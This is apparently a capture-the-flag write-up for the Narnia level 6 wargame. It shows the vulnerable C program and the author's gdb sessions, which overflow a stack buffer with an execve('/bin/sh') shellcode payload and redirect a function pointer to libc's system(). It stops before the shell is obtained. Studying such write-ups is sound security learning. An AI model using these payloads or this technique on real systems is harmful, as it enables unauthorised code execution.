==================== Source ==============================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}
=============================================================
I'm gonna try to overflow b2 
narnia6@narnia:~$ /narnia/narnia6 B1 B2                                          
B1
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*12')
AAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*15')
AAAAAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*16')
Segmentation fault (core dumped)

Oh! Let's fire up GDB

(gdb) run B1 $(python -c'print "A"*16')
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) run B1 $(python -c'print "A"*20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*20')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Nice! Now, where to point?

Let's see where this is actually happening, after a bit of fiddling with gdb we get this:
0x08048558 in get_sp ()
(gdb) 
0x08048697 in main ()
(gdb) 
0x08048699 in main ()
(gdb) 
0x080486a7 in main ()
(gdb) 
0x080486ab in main ()
(gdb) 
0x080486ae in main ()
(gdb) 
0x080486b2 in main ()
(gdb) 
0x41414141 in ?? ()
(gdb) 

Corresponds to this:

 8048692:	e8 b6 fe ff ff       	call   804854d <get_sp>
 8048697:	39 c3                	cmp    %eax,%ebx
 8048699:	75 0c                	jne    80486a7 <main+0x14e>
 804869b:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
 80486a2:	e8 69 fd ff ff       	call   8048410 <exit@plt>
 80486a7:	8d 44 24 20          	lea    0x20(%esp),%eax
 80486ab:	89 04 24             	mov    %eax,(%esp)
 80486ae:	8b 44 24 28          	mov    0x28(%esp),%eax
 80486b2:	ff d0                	call   *%eax

=============== Road block ===========================
My plan is to make the buffer bigger and pop the shellcode in there... but, as with anything else, there are issues.
Notably that if statement that makes the program exit with -1 when we throw the return address starting with ff, see below:

(gdb) run B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x08048558 in get_sp ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048697 in main ()
(gdb) x/100x $esp
0xffffd600:	0xffffd618	0xffffd81c	0x00000021	0x08048712
0xffffd610:	0x00000003	0xffffd6d4	0x41414141	0x41414141
0xffffd620:	0x41414141	0x41414141	0xffffd63c	0x90909090
0xffffd630:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd640:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd650:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd660:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd670:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd680:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd690:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6d0:	0x90909090	0x90909090	0x31909090	0x2f6850c0
0xffffd6e0:	0x6868732f	0x6e69622f	0x5350e389	0xc289e189
0xffffd6f0:	0x80cd0bb0	0xffffd900	0xffffd958	0xffffd965
0xffffd700:	0xffffde86	0xffffde91	0xffffde9c	0xffffdefa
0xffffd710:	0xffffdf11	0xffffdf20	0xffffdf32	0xffffdf43
0xffffd720:	0xffffdf4c	0xffffdf5f	0xffffdf67	0xffffdf77
0xffffd730:	0xffffdfa6	0xffffdfc6	0x00000000	0x00000020
0xffffd740:	0xf7fdbbe0	0x00000021	0xf7fdb000	0x00000010
0xffffd750:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xffffd760:	0x00000064	0x00000003	0x08048034	0x00000004
0xffffd770:	0x00000020	0x00000005	0x00000008	0x00000007
0xffffd780:	0xf7fdc000	0x00000008	0x00000000	0x00000009
(gdb) si
0x08048699 in main ()
(gdb) si
0x0804869b in main ()
(gdb) si
0x080486a2 in main ()
(gdb) 
0x08048410 in exit@plt ()
(gdb) 
0x08048416 in exit@plt ()
(gdb) 
0x0804841b in exit@plt ()
(gdb) 
0x080483c0 in ?? ()
(gdb) 
0x080483c6 in ?? ()


As we can see the execution flow above is different from what we see below with BBBB as the value passed to eip:


(gdb) run B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"') 
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x08048558 in get_sp ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048697 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x080486b2 in main ()
(gdb) c  
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Now I have to figure out how to trick the get_sp() function into letting me through.... or throw the shellcode into and address space not starting with ff.

========================== Address Space =============================
Trying to figure out where to put this shell.... let's see what's in /proc/$pid/maps

narnia6@narnia:~$ cat /proc/57/maps
08048000-08049000 r-xp 00000000 00:3b 2640                               /narnia/narnia6
08049000-0804a000 rw-p 00000000 00:3b 2640                               /narnia/narnia6
f7e22000-f7e23000 rw-p 00000000 00:00 0 
f7e23000-f7fca000 r-xp 00000000 00:3b 2649                               /lib32/libc-2.19.so
f7fca000-f7fcc000 r--p 001a7000 00:3b 2649                               /lib32/libc-2.19.so
f7fcc000-f7fcd000 rw-p 001a9000 00:3b 2649                               /lib32/libc-2.19.so
f7fcd000-f7fd1000 rw-p 00000000 00:00 0 
f7fd8000-f7fd9000 rw-p 00000000 00:00 0 
f7fd9000-f7fdb000 r--p 00000000 00:00 0                                  [vvar]
f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
f7fdc000-f7ffc000 r-xp 00000000 00:3b 2644                               /lib32/ld-2.19.so
f7ffc000-f7ffd000 r--p 0001f000 00:3b 2644                               /lib32/ld-2.19.so
f7ffd000-f7ffe000 rw-p 00020000 00:3b 2644                               /lib32/ld-2.19.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

Executable memory:

08048000-08049000 r-xp 00000000 00:3b 2640                               /narnia/narnia6
f7e23000-f7fca000 r-xp 00000000 00:3b 2649                               /lib32/libc-2.19.so
f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
f7fdc000-f7ffc000 r-xp 00000000 00:3b 2644                               /lib32/ld-2.19.so

Would you look at that, libc is in the executable address space. A bit of reading pointed me to a technique called "Return to libc".
Essentially to accomplish this you need to point eip to one of the many functions in libc, and in this case we can pass a parameter...
system("/bin/sh") is probably what we want here given the definition "int system(const char *cmd);"

First we need the address of the system() function, in gdb:

(gdb) print system
$5 = {<text variable, no debug info>} 0xf7e62e70 <system>

Thank god no one is using aslr here, that address should stay useful for a while ;)
Now we modify the payload:

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 BBBBBBBB $(python -c 'print "\x70\x2e\xe6\xf7"*5')

Breakpoint 8, 0xf7e62e70 in system () from /lib32/libc.so.6
(gdb) c
Continuing.
sh: 1: p.��p.��p.��: not found

[Inferior 1 (process 906) exited with code 01]
(gdb) 

Nice! so we are visiting system(), now we need to get the parameter to be "/bin/sh" as per the definition of system()
